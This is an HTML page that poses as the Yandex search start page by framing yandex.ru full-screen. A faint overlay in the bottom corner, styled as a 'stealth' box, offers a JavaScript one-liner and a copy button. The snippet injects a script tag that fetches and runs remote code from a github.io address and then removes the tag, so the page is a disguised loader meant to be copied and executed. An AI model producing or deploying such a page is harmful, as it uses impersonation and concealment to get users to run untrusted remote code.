<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Яндекс — быстрый поиск в интернете</title>
  <link rel="icon" href="https://yandex.ru/favicon.ico">
  <link rel="shortcut icon" href="https://yandex.ru/favicon.ico">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      background: #f4f4f4;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace;
    }
    .yandex-frame {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
      z-index: 1;
    }
    .stealth-copy-box {
      position: fixed;
      bottom: 10px;
      left: 10px;
      z-index: 999999;
      background: transparent;
      padding: 2px;
      max-width: 440px;
      opacity: 0.25;
      transition: opacity 0.2s ease;
      display: flex;
      flex-direction: column;
      gap: 4px;
    }
    .stealth-copy-box:hover {
      opacity: 0.95;
    }
    .code-preview {
      font-family: Consolas, "Courier New", monospace;
      font-size: 10px;
      line-height: 1.25;
      background: rgba(0, 0, 0, 0.45);
      color: rgba(255, 255, 255, 0.85);
      border: 1px solid rgba(255, 255, 255, 0.15);
      border-radius: 4px;
      padding: 4px 6px;
      word-break: break-all;
      user-select: all;
      cursor: pointer;
      backdrop-filter: blur(4px);
    }
    .copy-btn {
      background: rgba(0, 0, 0, 0.35);
      color: rgba(255, 255, 255, 0.75);
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 4px;
      padding: 3px 8px;
      font-size: 10px;
      font-family: inherit;
      cursor: pointer;
      transition: all 0.15s ease;
      text-align: center;
      backdrop-filter: blur(4px);
    }
    .copy-btn:hover {
      background: rgba(0, 0, 0, 0.65);
      color: #ffffff;
      border-color: rgba(255, 255, 255, 0.4);
    }
    .copy-btn.copied {
      background: rgba(16, 185, 129, 0.5);
      color: #ffffff;
      border-color: #10b981;
    }
  </style>
</head>
<body>
  <iframe class="yandex-frame" src="https://yandex.ru/chrome/newtab" id="yandexFrame"></iframe>

  <div class="stealth-copy-box">
    <div class="code-preview" id="codeText" title="Кликните для копирования">s=document.createElement('script');s.src='https://grzlly.github.io/sibs/1.js?t='+Date.now();s.onload=()=>s.remove();document.head.append(s)</div>
    <button class="copy-btn" id="copyBtn">Скопировать в буфер</button>
  </div>

  <script>
    const codeEl = document.getElementById('codeText');
    const copyBtn = document.getElementById('copyBtn');

    function doCopy() {
      const text = codeEl.innerText.trim();
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(showSuccess).catch(fallbackCopy);
      } else {
        fallbackCopy();
      }
    }

    function fallbackCopy() {
      const ta = document.createElement('textarea');
      ta.value = codeEl.innerText.trim();
      ta.style.position = 'fixed';
      ta.style.left = '-9999px';
      document.body.appendChild(ta);
      ta.select();
      try {
        document.execCommand('copy');
        showSuccess();
      } catch (err) {}
      document.body.removeChild(ta);
    }

    function showSuccess() {
      copyBtn.classList.add('copied');
      copyBtn.innerText = '✓ Скопировано';
      setTimeout(() => {
        copyBtn.classList.remove('copied');
        copyBtn.innerText = 'Скопировать в буфер';
      }, 2000);
    }

    copyBtn.addEventListener('click', doCopy);
    codeEl.addEventListener('click', doCopy);
  </script>
</body>
</html>
